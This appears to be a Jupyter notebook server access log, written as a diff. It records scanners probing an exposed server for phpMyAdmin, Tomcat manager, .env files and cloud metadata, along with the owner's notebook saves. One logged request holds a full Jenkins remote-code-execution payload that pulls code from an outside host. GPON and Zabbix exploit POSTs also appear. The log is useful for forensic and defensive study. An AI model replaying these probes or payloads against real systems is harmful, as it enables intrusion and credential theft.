+[W 23:42:39.882 NotebookApp] 404 GET /phpMyAdmin-2.6.1-pl2 (102.165.35.136) 1.69ms referer=http://104.155.55.255:8080/
+[I 23:42:40.642 NotebookApp] 302 GET /phpMyAdmin-2.6.1-pl3/ (102.165.35.136) 0.50ms
+[W 23:42:41.564 NotebookApp] 404 GET /phpMyAdmin-2.6.1-pl3 (102.165.35.136) 1.46ms referer=http://104.155.55.255:8080/
+[I 23:42:42.554 NotebookApp] 302 GET /phpMyAdmin-2.6.2-rc1/ (102.165.35.136) 0.54ms
+[W 23:42:43.416 NotebookApp] 404 GET /phpMyAdmin-2.6.2-rc1 (102.165.35.136) 1.42ms referer=http://104.155.55.255:8080/
+[I 23:42:44.294 NotebookApp] 302 GET /phpMyAdmin-2.6.2-beta1/ (102.165.35.136) 0.50ms
+[W 23:42:45.101 NotebookApp] 404 GET /phpMyAdmin-2.6.2-beta1 (102.165.35.136) 1.58ms referer=http://104.155.55.255:8080/
+[I 23:42:45.973 NotebookApp] 302 GET /phpMyAdmin-2.6.2-rc1/ (102.165.35.136) 0.49ms
+[W 23:42:46.922 NotebookApp] 404 GET /phpMyAdmin-2.6.2-rc1 (102.165.35.136) 1.58ms referer=http://104.155.55.255:8080/
+[I 23:42:47.921 NotebookApp] 302 GET /phpMyAdmin-2.6.2/ (102.165.35.136) 0.57ms
+[W 23:42:48.708 NotebookApp] 404 GET /phpMyAdmin-2.6.2 (102.165.35.136) 1.66ms referer=http://104.155.55.255:8080/
+[I 23:42:49.657 NotebookApp] 302 GET /phpMyAdmin-2.6.2-pl1/ (102.165.35.136) 0.54ms
+[W 23:42:50.487 NotebookApp] 404 GET /phpMyAdmin-2.6.2-pl1 (102.165.35.136) 1.86ms referer=http://104.155.55.255:8080/
+[I 23:42:51.445 NotebookApp] 302 GET /phpMyAdmin-2.6.3/ (102.165.35.136) 0.52ms
+[W 23:42:52.393 NotebookApp] 404 GET /phpMyAdmin-2.6.3 (102.165.35.136) 1.59ms referer=http://104.155.55.255:8080/
+[I 23:42:53.330 NotebookApp] 302 GET /phpMyAdmin-2.6.3-rc1/ (102.165.35.136) 0.52ms
+[W 23:42:54.245 NotebookApp] 404 GET /phpMyAdmin-2.6.3-rc1 (102.165.35.136) 1.57ms referer=http://104.155.55.255:8080/
+[I 23:42:55.215 NotebookApp] 302 GET /phpMyAdmin-2.6.3/ (102.165.35.136) 0.51ms
+[W 23:42:56.189 NotebookApp] 404 GET /phpMyAdmin-2.6.3 (102.165.35.136) 1.51ms referer=http://104.155.55.255:8080/
+[I 23:42:56.958 NotebookApp] 302 GET /phpMyAdmin-2.6.3-pl1/ (102.165.35.136) 0.50ms
+[W 23:42:58.095 NotebookApp] 404 GET /phpMyAdmin-2.6.3-pl1 (102.165.35.136) 1.56ms referer=http://104.155.55.255:8080/
+[I 23:42:58.978 NotebookApp] 302 GET /phpMyAdmin-2.6.4-rc1/ (102.165.35.136) 0.60ms
+[W 23:42:59.948 NotebookApp] 404 GET /phpMyAdmin-2.6.4-rc1 (102.165.35.136) 1.51ms referer=http://104.155.55.255:8080/
+[I 23:43:01.096 NotebookApp] 302 GET /phpMyAdmin-2.6.4-pl1/ (102.165.35.136) 0.57ms
+[W 23:43:01.932 NotebookApp] 404 GET /phpMyAdmin-2.6.4-pl1 (102.165.35.136) 1.52ms referer=http://104.155.55.255:8080/
+[I 23:43:02.836 NotebookApp] 302 GET /phpMyAdmin-2.6.4-pl2/ (102.165.35.136) 0.52ms
+[W 23:43:03.835 NotebookApp] 404 GET /phpMyAdmin-2.6.4-pl2 (102.165.35.136) 1.64ms referer=http://104.155.55.255:8080/
+[I 23:43:04.735 NotebookApp] 302 GET /phpMyAdmin-2.6.4-pl3/ (102.165.35.136) 0.50ms
+[W 23:43:05.717 NotebookApp] 404 GET /phpMyAdmin-2.6.4-pl3 (102.165.35.136) 1.62ms referer=http://104.155.55.255:8080/
+[I 23:43:06.542 NotebookApp] 302 GET /phpMyAdmin-2.6.4-pl4/ (102.165.35.136) 0.51ms
+[W 23:43:07.384 NotebookApp] 404 GET /phpMyAdmin-2.6.4-pl4 (102.165.35.136) 1.43ms referer=http://104.155.55.255:8080/
+[I 23:43:08.415 NotebookApp] 302 GET /phpMyAdmin-2.6.4/ (102.165.35.136) 0.49ms
+[W 23:43:09.482 NotebookApp] 404 GET /phpMyAdmin-2.6.4 (102.165.35.136) 1.62ms referer=http://104.155.55.255:8080/
+[I 23:43:10.276 NotebookApp] 302 GET /phpMyAdmin-2.7.0-beta1/ (102.165.35.136) 0.54ms
+[W 23:43:11.115 NotebookApp] 404 GET /phpMyAdmin-2.7.0-beta1 (102.165.35.136) 1.48ms referer=http://104.155.55.255:8080/
+[I 23:43:12.001 NotebookApp] 302 GET /phpMyAdmin-2.7.0-rc1/ (102.165.35.136) 0.51ms
+[W 23:43:13.080 NotebookApp] 404 GET /phpMyAdmin-2.7.0-rc1 (102.165.35.136) 1.51ms referer=http://104.155.55.255:8080/
+[I 23:43:14.107 NotebookApp] 302 GET /phpMyAdmin-2.7.0-pl1/ (102.165.35.136) 0.48ms
+[W 23:43:15.005 NotebookApp] 404 GET /phpMyAdmin-2.7.0-pl1 (102.165.35.136) 1.52ms referer=http://104.155.55.255:8080/
+[I 23:43:16.104 NotebookApp] 302 GET /phpMyAdmin-2.7.0-pl2/ (102.165.35.136) 0.52ms
+[W 23:43:17.513 NotebookApp] 404 GET /phpMyAdmin-2.7.0-pl2 (102.165.35.136) 1.56ms referer=http://104.155.55.255:8080/
+[I 23:43:18.522 NotebookApp] 302 GET /phpMyAdmin-2.7.0/ (102.165.35.136) 0.44ms
+[W 23:43:19.568 NotebookApp] 404 GET /phpMyAdmin-2.7.0 (102.165.35.136) 1.51ms referer=http://104.155.55.255:8080/
+[I 23:43:20.691 NotebookApp] 302 GET /phpMyAdmin-2.8.0-beta1/ (102.165.35.136) 0.49ms
+[W 23:43:21.725 NotebookApp] 404 GET /phpMyAdmin-2.8.0-beta1 (102.165.35.136) 1.58ms referer=http://104.155.55.255:8080/
+[I 23:43:23.628 NotebookApp] 302 GET /phpMyAdmin-2.8.0-rc1/ (102.165.35.136) 0.47ms
+[W 23:43:24.674 NotebookApp] 404 GET /phpMyAdmin-2.8.0-rc1 (102.165.35.136) 1.61ms referer=http://104.155.55.255:8080/
+[I 23:43:26.816 NotebookApp] 302 GET /phpMyAdmin-2.8.0-rc2/ (102.165.35.136) 0.58ms
+[W 23:43:28.030 NotebookApp] 404 GET /phpMyAdmin-2.8.0-rc2 (102.165.35.136) 1.57ms referer=http://104.155.55.255:8080/
+[I 23:43:29.115 NotebookApp] 302 GET /phpMyAdmin-2.8.0/ (102.165.35.136) 0.46ms
+[W 23:43:30.048 NotebookApp] 404 GET /phpMyAdmin-2.8.0 (102.165.35.136) 1.79ms referer=http://104.155.55.255:8080/
+[I 23:43:30.884 NotebookApp] 302 GET /phpMyAdmin-2.8.0.1/ (102.165.35.136) 0.52ms
+[W 23:43:31.912 NotebookApp] 404 GET /phpMyAdmin-2.8.0.1 (102.165.35.136) 1.54ms referer=http://104.155.55.255:8080/
+[I 23:43:33.281 NotebookApp] 302 GET /phpMyAdmin-2.8.0.2/ (102.165.35.136) 0.62ms
+[W 23:43:34.286 NotebookApp] 404 GET /phpMyAdmin-2.8.0.2 (102.165.35.136) 1.60ms referer=http://104.155.55.255:8080/
+[I 23:43:35.324 NotebookApp] 302 GET /phpMyAdmin-2.8.0.3/ (102.165.35.136) 0.46ms
+[W 23:43:36.517 NotebookApp] 404 GET /phpMyAdmin-2.8.0.3 (102.165.35.136) 1.57ms referer=http://104.155.55.255:8080/
+[I 23:43:37.830 NotebookApp] 302 GET /phpMyAdmin-2.8.0.4/ (102.165.35.136) 0.54ms
+[W 23:43:39.014 NotebookApp] 404 GET /phpMyAdmin-2.8.0.4 (102.165.35.136) 1.56ms referer=http://104.155.55.255:8080/
+[I 23:43:40.193 NotebookApp] 302 GET /phpMyAdmin-2.8.1-rc1/ (102.165.35.136) 0.57ms
+[W 23:43:41.578 NotebookApp] 404 GET /phpMyAdmin-2.8.1-rc1 (102.165.35.136) 1.52ms referer=http://104.155.55.255:8080/
+[I 23:43:42.905 NotebookApp] 302 GET /phpMyAdmin-2.8.1/ (102.165.35.136) 0.62ms
+[W 23:43:43.715 NotebookApp] 404 GET /phpMyAdmin-2.8.1 (102.165.35.136) 1.60ms referer=http://104.155.55.255:8080/
+[I 23:43:44.955 NotebookApp] 302 GET /phpMyAdmin-2.8.2/ (102.165.35.136) 0.53ms
+[W 23:43:46.058 NotebookApp] 404 GET /phpMyAdmin-2.8.2 (102.165.35.136) 1.71ms referer=http://104.155.55.255:8080/
+[I 23:43:47.117 NotebookApp] 302 GET /sqlmanager/ (102.165.35.136) 0.45ms
+[W 23:43:48.427 NotebookApp] 404 GET /sqlmanager (102.165.35.136) 1.57ms referer=http://104.155.55.255:8080/
+[I 23:43:49.932 NotebookApp] 302 GET /mysqlmanager/ (102.165.35.136) 0.53ms
+[W 23:43:51.073 NotebookApp] 404 GET /mysqlmanager (102.165.35.136) 1.92ms referer=http://104.155.55.255:8080/
+[I 23:43:53.990 NotebookApp] 302 GET /p/m/a/ (102.165.35.136) 0.59ms
+[W 23:43:55.298 NotebookApp] 404 GET /p/m/a (102.165.35.136) 1.85ms referer=http://104.155.55.255:8080/
+[I 23:43:56.720 NotebookApp] 302 GET /PMA2005/ (102.165.35.136) 0.54ms
+[W 23:43:57.911 NotebookApp] 404 GET /PMA2005 (102.165.35.136) 1.52ms referer=http://104.155.55.255:8080/
+[I 23:43:58.901 NotebookApp] 302 GET /pma2005/ (102.165.35.136) 0.61ms
+[W 23:43:59.678 NotebookApp] 404 GET /pma2005 (102.165.35.136) 1.80ms referer=http://104.155.55.255:8080/
+[I 23:44:00.366 NotebookApp] 302 GET /phpmanager/ (102.165.35.136) 0.57ms
+[W 23:44:01.203 NotebookApp] 404 GET /phpmanager (102.165.35.136) 1.49ms referer=http://104.155.55.255:8080/
+[I 23:44:02.119 NotebookApp] 302 GET /php-myadmin/ (102.165.35.136) 0.57ms
+[W 23:44:03.023 NotebookApp] 404 GET /php-myadmin (102.165.35.136) 1.51ms referer=http://104.155.55.255:8080/
+[I 23:44:04.666 NotebookApp] 302 GET /phpmy-admin/ (102.165.35.136) 0.59ms
+[W 23:44:05.645 NotebookApp] 404 GET /phpmy-admin (102.165.35.136) 2.01ms referer=http://104.155.55.255:8080/
+[I 23:44:06.655 NotebookApp] 302 GET /webadmin/ (102.165.35.136) 0.44ms
+[W 23:44:07.875 NotebookApp] 404 GET /webadmin (102.165.35.136) 1.92ms referer=http://104.155.55.255:8080/
+[I 23:44:09.086 NotebookApp] 302 GET /sqlweb/ (102.165.35.136) 0.64ms
+[W 23:44:10.395 NotebookApp] 404 GET /sqlweb (102.165.35.136) 1.82ms referer=http://104.155.55.255:8080/
+[I 23:44:11.935 NotebookApp] 302 GET /websql/ (102.165.35.136) 0.53ms
+[W 23:44:13.276 NotebookApp] 404 GET /websql (102.165.35.136) 1.40ms referer=http://104.155.55.255:8080/
+[I 23:44:14.494 NotebookApp] 302 GET /webdb/ (102.165.35.136) 0.48ms
+[W 23:44:15.309 NotebookApp] 404 GET /webdb (102.165.35.136) 1.45ms referer=http://104.155.55.255:8080/
+[I 23:44:15.796 NotebookApp] 302 GET /mysqladmin/ (102.165.35.136) 0.50ms
+[W 23:44:16.337 NotebookApp] 404 GET /mysqladmin (102.165.35.136) 1.89ms referer=http://104.155.55.255:8080/
+[I 23:44:16.831 NotebookApp] 302 GET /mysql-admin/ (102.165.35.136) 0.58ms
+[W 23:44:17.372 NotebookApp] 404 GET /mysql-admin (102.165.35.136) 1.59ms referer=http://104.155.55.255:8080/
+[I 00:32:18.696 NotebookApp] 302 GET / (152.250.210.87) 0.68ms
+[I 01:19:45.113 NotebookApp] 302 GET / (134.209.14.80) 1.17ms
+[I 01:19:45.250 NotebookApp] 302 GET /tree? (134.209.14.80) 1.77ms
+[I 02:06:11.589 NotebookApp] 302 GET / (36.71.235.235) 0.81ms
+[I 04:33:28.503 NotebookApp] 302 GET / (131.153.31.58) 0.73ms
+[I 05:25:40.003 NotebookApp] 302 GET / (131.153.31.58) 0.69ms
+[I 06:20:06.896 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:06:13.037 NotebookApp] 302 GET / (103.96.51.85) 0.61ms
+[I 09:50:45.896 NotebookApp] 302 GET / (78.26.155.185) 0.56ms
+[I 10:07:41.435 NotebookApp] 302 GET / (186.46.0.114) 0.75ms
+[I 10:42:24.776 NotebookApp] 302 GET / (193.33.216.232) 0.54ms
+[I 11:12:38.923 NotebookApp] 302 GET / (184.105.139.69) 0.62ms
+[I 14:25:33.400 NotebookApp] 302 GET / (194.61.24.169) 0.67ms
+[I 14:25:33.456 NotebookApp] 302 GET /tree? (194.61.24.169) 0.84ms
+[I 14:55:25.763 NotebookApp] 302 GET / (190.104.155.86) 0.63ms
+[I 16:24:31.120 NotebookApp] 302 GET / (46.219.230.232) 0.63ms
+[I 16:34:19.307 NotebookApp] 302 GET / (189.173.40.205) 0.59ms
+[W 18:10:55.617 NotebookApp] 404 GET /manager/html (60.164.173.49) 2.01ms referer=None
+[I 18:22:02.679 NotebookApp] 302 GET / (191.10.21.83) 0.60ms
+[I 18:45:30.321 NotebookApp] 302 GET / (104.155.232.167) 0.55ms
+[I 18:45:30.834 NotebookApp] 302 GET /tree? (104.155.232.167) 0.89ms
+[I 19:02:34.174 NotebookApp] 302 GET / (46.176.193.97) 0.68ms
+[I 19:21:41.497 NotebookApp] 302 GET / (104.155.158.12) 0.54ms
+[I 19:21:41.697 NotebookApp] 302 GET /tree? (104.155.158.12) 1.01ms
+[I 19:42:05.957 NotebookApp] 302 GET / (104.155.217.165) 0.66ms
+[I 19:42:06.468 NotebookApp] 302 GET /tree? (104.155.217.165) 0.94ms
+[W 19:46:46.085 NotebookApp] 404 GET http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true (46.246.35.89) 1.79ms referer=None
+[W 20:03:06.898 NotebookApp] WebSocket ping timeout after 119692 ms.
+[I 20:09:08.501 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 20:19:12.039 NotebookApp] 302 GET / (213.137.34.114) 0.57ms
+[I 20:21:59.873 NotebookApp] 302 GET / (209.17.96.114) 0.71ms
+[W 21:01:08.502 NotebookApp] WebSocket ping timeout after 119795 ms.
+[W 21:45:01.098 NotebookApp] 405 HEAD / (208.113.196.8) 0.76ms referer=None
+[I 22:57:49.986 NotebookApp] 302 GET / (82.140.197.208) 0.78ms
+[I 23:38:15.188 NotebookApp] 302 GET / (5.104.21.95) 0.65ms
+[W 00:38:55.817 NotebookApp] 404 GET /manager/html (123.160.10.43) 1.98ms referer=None
+[I 01:34:10.508 NotebookApp] 302 GET / (173.212.231.230) 0.83ms
+[I 01:34:10.529 NotebookApp] 302 GET /tree? (173.212.231.230) 1.07ms
+[I 01:46:29.749 NotebookApp] 302 GET / (200.116.175.41) 0.57ms
+[I 03:24:52.582 NotebookApp] 302 GET / (80.82.70.118) 0.77ms
+[I 04:00:47.470 NotebookApp] 302 GET / (200.58.84.172) 0.56ms
+[I 04:21:54.823 NotebookApp] 302 GET / (139.255.38.195) 0.85ms
+[I 04:56:03.437 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[W 05:01:03.438 NotebookApp] WebSocket ping timeout after 119936 ms.
+[I 05:20:23.590 NotebookApp] 302 GET / (139.162.79.87) 0.69ms
+[I 07:19:43.340 NotebookApp] 302 GET / (185.168.226.58) 0.74ms
+[I 09:17:22.666 NotebookApp] 302 GET / (92.112.9.45) 0.71ms
+[I 09:27:32.560 NotebookApp] 302 GET / (168.197.104.176) 0.63ms
+[I 09:34:33.837 NotebookApp] 302 GET / (77.159.75.186) 0.67ms
+[I 10:54:48.695 NotebookApp] 302 GET / (201.160.78.20) 0.69ms
+[I 12:29:19.790 NotebookApp] 302 GET / (200.53.21.68) 0.89ms
+[I 12:42:57.541 NotebookApp] 302 GET / (74.82.47.2) 0.57ms
+[I 12:50:51.527 NotebookApp] 302 GET / (82.119.124.86) 0.63ms
+[I 13:54:14.287 NotebookApp] 302 GET / (177.47.202.88) 0.96ms
+[I 14:05:25.467 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[W 14:39:05.515 NotebookApp] 404 GET /api/.env (93.87.76.24) 1.96ms referer=None
+[W 15:17:54.680 NotebookApp] 404 GET /admin.php (185.101.33.134) 2.61ms referer=None
+[I 16:53:52.912 NotebookApp] 302 GET / (201.17.131.124) 0.95ms
+[I 17:04:42.259 NotebookApp] 302 GET / (74.118.88.211) 0.67ms
+[W 17:59:53.274 NotebookApp] 404 GET /manager/html (122.112.197.81) 1.85ms referer=None
+[I 18:09:11.409 NotebookApp] 302 GET / (92.112.47.198) 0.66ms
+[I 18:50:56.453 NotebookApp] 302 GET / (209.17.96.138) 0.69ms
+[I 19:27:49.806 NotebookApp] 302 GET / (222.124.193.210) 0.68ms
+[W 19:36:55.469 NotebookApp] WebSocket ping timeout after 119970 ms.
+[I 20:36:48.271 NotebookApp] 302 GET / (71.6.232.4) 0.69ms
+[I 23:56:37.748 NotebookApp] 302 GET / (170.254.73.49) 0.67ms
+[I 00:13:00.937 NotebookApp] 302 GET / (61.219.11.153) 0.65ms
+[I 00:18:19.670 NotebookApp] 302 GET / (188.94.32.46) 0.54ms
+[I 00:30:47.949 NotebookApp] 302 GET / (191.193.225.246) 0.66ms
+[I 00:55:03.467 NotebookApp] 302 GET / (188.183.30.64) 0.55ms
+[W 00:55:03.554 NotebookApp] 404 GET /admin-scripts.asp (188.183.30.64) 2.16ms referer=None
+[W 01:04:52.978 NotebookApp] 405 CONNECT www.baidu.com:443 (59.36.132.222) 2.43ms referer=None
+[W 01:04:53.540 NotebookApp] 404 GET http://www.baidu.com/ (59.36.132.222) 1.70ms referer=None
+[W 01:29:15.654 NotebookApp] 404 HEAD http://123.125.114.144/ (218.62.245.231) 1.70ms referer=None
+[I 01:49:29.988 NotebookApp] 302 GET / (114.116.26.85) 0.54ms
+[I 01:49:30.307 NotebookApp] 302 GET /tree? (114.116.26.85) 0.93ms
+[W 02:52:31.496 NotebookApp] 404 GET /manager/html (118.123.8.168) 1.98ms referer=None
+[I 02:53:36.969 NotebookApp] 302 GET / (177.94.71.230) 0.61ms
+[I 04:29:17.877 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 05:17:50.142 NotebookApp] 302 GET / (195.162.81.103) 0.69ms
+[I 06:08:48.382 NotebookApp] 302 GET / (187.138.97.2) 0.64ms
+[I 07:36:10.874 NotebookApp] 302 GET / (191.100.10.37) 0.73ms
+[W 07:36:11.344 NotebookApp] 404 GET /admin-scripts.asp (191.100.10.37) 2.24ms referer=None
+[I 08:41:39.423 NotebookApp] 302 GET / (195.88.16.134) 0.72ms
+[I 09:18:42.004 NotebookApp] 302 GET / (36.79.75.168) 0.70ms
+[I 11:50:54.852 NotebookApp] 302 GET / (138.0.227.117) 0.67ms
+[I 13:28:16.816 NotebookApp] 302 GET / (177.188.24.126) 0.57ms
+[I 14:02:26.308 NotebookApp] 302 GET / (74.82.47.2) 0.82ms
+[I 14:03:48.282 NotebookApp] 302 GET / (191.254.232.39) 0.54ms
+[W 15:18:12.959 NotebookApp] 404 GET /manager/html (119.205.193.75) 1.99ms referer=None
+[I 16:35:11.290 NotebookApp] 302 GET / (83.30.122.75) 0.67ms
+[I 17:46:39.944 NotebookApp] 302 GET / (209.17.96.66) 0.71ms
+[I 18:27:41.794 NotebookApp] 302 GET / (46.246.186.152) 0.69ms
+[I 18:28:40.556 NotebookApp] 302 GET / (5.166.117.168) 0.56ms
+[I 18:33:20.300 NotebookApp] 302 GET / (80.82.77.139) 0.52ms
+[I 18:33:20.319 NotebookApp] 302 GET /tree (80.82.77.139) 0.95ms
+[W 19:00:17.879 NotebookApp] WebSocket ping timeout after 119837 ms.
+[W 21:04:40.973 NotebookApp] 404 GET /manager/html (197.232.1.182) 2.23ms referer=None
+[W 21:45:58.277 NotebookApp] 404 GET http://5.188.210.101/echo.php (5.188.210.101) 1.90ms referer=https://www.google.com/
+[I 23:21:05.421 NotebookApp] 302 GET / (122.102.29.207) 0.68ms
+[I 03:14:08.027 NotebookApp] 302 GET / (89.242.124.253) 0.83ms
+[I 03:35:45.392 NotebookApp] 302 GET / (41.169.10.178) 0.60ms
+[I 03:43:16.606 NotebookApp] 302 GET / (196.52.43.108) 0.69ms
+[W 03:58:31.430 NotebookApp] 404 GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27nuAObHkS%27,%20root=%27http://185.162.235.211%27)%0a@Grab(group=%27package%27,%20module=%27nuAObHkS%27,%20version=%271%27)%0aimport%20nuAObHkS; (89.248.171.57) 2.07ms referer=http://104.155.55.255:8080/
+[I 04:32:48.541 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[W 05:20:08.811 NotebookApp] 403 POST /GponForm/diag_Form?images/ (61.147.96.101): '_xsrf' argument missing from POST
+[W 05:20:08.813 NotebookApp] 403 POST /GponForm/diag_Form?images/ (61.147.96.101) 269.08ms referer=None
+[W 07:09:31.905 NotebookApp] 404 GET /manager/html (119.205.193.75) 1.78ms referer=None
+[I 07:16:52.414 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:17:08.772 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:18:53.164 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:19:30.528 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:20:52.387 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:22:53.165 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:26:53.211 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:28:52.369 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:30:31.978 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:30:52.383 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:30:56.562 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:32:16.093 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:32:41.338 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:32:52.435 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:32:58.664 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:36:52.404 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:38:06.457 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:38:14.690 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:38:52.336 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:50:53.167 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:52:52.359 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:53:24.575 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:54:52.388 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:56:52.415 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:58:52.357 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:58:58.935 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:00:53.148 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:04:49.684 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:06:52.329 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:06:55.703 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:08:52.338 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:10:09.320 NotebookApp] 302 GET / (195.135.238.13) 0.69ms
+[I 08:10:52.340 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:12:52.352 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:19:30.040 NotebookApp] 302 GET / (201.92.242.84) 0.62ms
+[I 08:36:17.631 NotebookApp] 302 GET / (61.219.11.153) 0.70ms
+[I 09:43:23.012 NotebookApp] 302 GET / (91.222.222.48) 0.65ms
+[W 09:46:48.542 NotebookApp] WebSocket ping timeout after 119832 ms.
+[I 11:16:24.735 NotebookApp] 302 GET / (138.255.207.9) 1.04ms
+[I 11:26:09.210 NotebookApp] 302 GET / (45.77.116.41) 0.78ms
+[I 11:26:09.462 NotebookApp] 302 GET /tree? (45.77.116.41) 1.08ms
+[I 12:09:44.328 NotebookApp] 302 GET / (36.89.133.221) 0.84ms
+[I 13:15:31.980 NotebookApp] 302 GET / (103.47.219.163) 0.77ms
+[W 13:20:26.244 NotebookApp] 403 POST /zabbix/index.php (61.147.96.101): '_xsrf' argument missing from POST
+[W 13:20:26.246 NotebookApp] 403 POST /zabbix/index.php (61.147.96.101) 2854.30ms referer=None
+[I 13:42:20.228 NotebookApp] 302 GET / (74.82.47.3) 0.60ms
+[I 15:22:37.049 NotebookApp] 302 GET / (187.57.35.226) 0.73ms
+[W 15:35:13.288 NotebookApp] 403 POST /GponForm/diag_Form?images/ (61.147.96.101): '_xsrf' argument missing from POST
+[W 15:35:13.290 NotebookApp] 403 POST /GponForm/diag_Form?images/ (61.147.96.101) 320.74ms referer=None
+[I 15:52:58.082 NotebookApp] 302 GET / (177.68.105.86) 0.60ms
+[I 16:08:00.923 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 16:09:13.376 NotebookApp] 302 GET / (170.231.253.132) 0.56ms
+[I 23:07:48.301 NotebookApp] 302 GET / (209.17.96.234) 0.73ms
+[I 01:19:33.495 NotebookApp] 302 GET / (45.167.61.11) 0.70ms
+[I 02:50:03.412 NotebookApp] 302 GET / (52.151.14.7) 0.63ms
+[I 02:50:03.564 NotebookApp] 302 GET /tree? (52.151.14.7) 0.93ms
+[I 03:13:25.728 NotebookApp] 302 GET / (185.234.172.242) 0.65ms
+[I 03:35:30.178 NotebookApp] 302 GET / (113.11.87.186) 0.72ms
+[I 04:12:46.231 NotebookApp] 302 GET / (78.187.203.250) 0.70ms
+[I 04:35:23.557 NotebookApp] 302 GET / (194.61.24.169) 0.59ms
+[I 04:35:23.609 NotebookApp] 302 GET /tree? (194.61.24.169) 0.87ms
+[I 05:11:11.608 NotebookApp] 302 GET / (194.32.117.3) 0.59ms
+[I 05:14:47.383 NotebookApp] 302 GET / (191.254.170.101) 0.56ms
+[I 06:37:16.787 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:37:19.735 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:39:16.768 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:41:16.723 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:43:16.666 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 06:44:25.763 NotebookApp] 404 GET /manager/html (111.73.45.155) 1.80ms referer=None
+[I 06:47:16.697 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:53:16.666 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:55:15.746 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:57:20.116 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:59:16.840 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:01:16.679 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:03:17.496 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:29:16.740 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:31:17.537 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:33:17.517 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:39:16.760 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:41:17.505 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:49:17.551 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:50:55.896 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:51:16.662 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:51:31.055 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:52:29.749 NotebookApp] 302 GET / (65.95.73.2) 0.54ms
+[I 07:53:16.671 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
